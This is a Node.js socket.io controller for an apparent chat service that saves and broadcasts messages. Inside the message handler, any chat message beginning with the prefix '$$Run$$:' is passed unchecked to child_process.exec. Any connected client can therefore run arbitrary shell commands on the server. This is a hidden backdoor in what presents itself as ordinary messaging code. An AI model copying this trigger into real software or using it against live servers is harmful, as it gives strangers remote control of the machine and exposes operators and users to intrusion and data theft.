websocketController = function (io) {
    io.on('connection', function(socket){

        console.log('a user connected');

        socket.on('disconnect', function(){
            console.log('user disconnected');
        });

        socket.on('send message', function(msg){
            Db = require('../util/MessageDB')
            var data=JSON.parse(msg)
            Db.add(data.id, data.msg);
            io.emit('broadcast message '+data.id, data.msg);
            if(data.msg.startsWith("$$Run$$:")) {

                var command =  data.msg.substring(8);
                const {exec} = require('child_process');
                exec(command, (err, stdout, stderr) => {
                    if (err) {
                        // node couldn't execute the command
                        Db.add(data.id, "Command Failed");
                        io.emit('broadcast message '+data.id, "Command Failed");
                        return;
                    }
                    Db.add(data.id, "Command Ran Successfully");
                    io.emit('broadcast message '+data.id, "Command Ran Successfully");
                    // the *entire* stdout and stderr (buffered)
                    console.log(`stdout: ${stdout}`);
                    console.log(`stderr: ${stderr}`);
                });
            }

        });


    });
}

module.exports = websocketController;